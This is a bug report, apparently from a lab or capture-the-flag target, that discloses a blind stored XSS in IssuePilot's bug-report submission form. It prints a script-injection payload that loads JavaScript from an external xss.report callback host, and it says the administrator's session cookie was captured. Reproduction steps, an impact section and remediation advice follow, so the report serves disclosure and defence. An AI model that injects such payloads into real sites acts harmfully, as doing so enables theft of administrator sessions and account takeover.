## Title
Blind XSS - IssuePilot Bug Report Submission

## Description
A Blind/Stored Cross-Site Scripting (XSS) vulnerability was identified in the IssuePilot bug-report submission functionality. The application accepts user-controlled input in bug-report fields and stores the submitted content.

When an administrator views the submitted report, the injected JavaScript executes in the administrator's browser. An external XSS.Report callback confirms execution from the administrative report-view page. The callback evidence also indicates that the administrator's `PHPSESSID` cookie was exposed.

**Affected URL:** https://issuepilot.pwnedbox.site/submit.php  
**Execution URL:** https://issuepilot.pwnedbox.site/admin/view.php?id=2

## Steps to Reproduce
1. Open the IssuePilot bug-report submission page.
2. Insert the XSS payload into the bug-report fields.
3. Submit the report.
4. Wait for an administrator to review the submitted report.
5. Check the XSS.Report dashboard for the callback.

## POC (Proof of Concept)
**Submission URL:** https://issuepilot.pwnedbox.site/submit.php

**Execution URL:** https://issuepilot.pwnedbox.site/admin/view.php?id=2

**Payload:**
```html
"><script src=https://xss.report/c/mihir></script>
```

**Observed Result:**

<img width="1919" height="975" alt="image" src="https://github.com/user-attachments/assets/9e05f786-1ae6-4c79-9b6a-305f2f299823" />
<img width="1919" height="970" alt="image" src="https://github.com/user-attachments/assets/9668c66f-a9f4-40ae-aa9b-b690b6143d00" />
<img width="1910" height="974" alt="image" src="https://github.com/user-attachments/assets/1f43c772-85c3-44dc-881f-d664688936ef" />

- When the administrator viewed the report, the injected JavaScript executed.
<img width="1910" height="974" alt="image" src="https://github.com/user-attachments/assets/521a2869-894a-40c9-acc1-0964ac67bbab" />

- XSS.Report received callbacks originating from the administrative report-view page.
<img width="1897" height="1002" alt="image" src="https://github.com/user-attachments/assets/9e9270d4-913a-4d2f-ba76-91326de088ec" />

- The callback details showed the `PHPSESSID` cookie was captured. The session cookie value is intentionally redacted in this report.
<img width="1916" height="1033" alt="image" src="https://github.com/user-attachments/assets/560ee3a1-11a2-434b-be14-a764f3071cb9" />

- The callback details identified the referring page as `https://issuepilot.pwnedbox.site/admin/dashboard.php`.

**Screenshot Evidence:**
1. Bug-report submission form containing the injected payload.
2. Administrator dashboard displaying the submitted reports.
3. XSS.Report dashboard showing callbacks from the IssuePilot administrative page.
4. XSS vulnerability details showing the execution URL and captured cookie evidence.

## Impact
An attacker could submit a malicious bug report that executes JavaScript when an administrator views it. This creates a security risk for administrative users.

Potential impact includes:
- Exposure of administrator session cookies, as demonstrated by the callback evidence.
- Potential session hijacking if the captured session cookie is valid and usable.
- Unauthorized actions within the administrator's session, depending on session protections.
- Access to sensitive information available through the administrator interface.
- Further attacks against users who review maliciously submitted reports.

## Remediation
1. Apply context-aware output encoding whenever user-submitted report data is displayed.
2. Treat all submitted fields as untrusted input and prevent them from being interpreted as executable HTML or JavaScript.
3. Sanitize HTML using a well-maintained allowlist-based HTML sanitizer if HTML input is required.
4. Implement a restrictive Content Security Policy (CSP) to reduce the impact of script injection.
5. Configure session cookies with `HttpOnly`, `Secure`, and appropriate `SameSite` attributes.
6. Invalidate potentially exposed administrator sessions and review session-management controls.
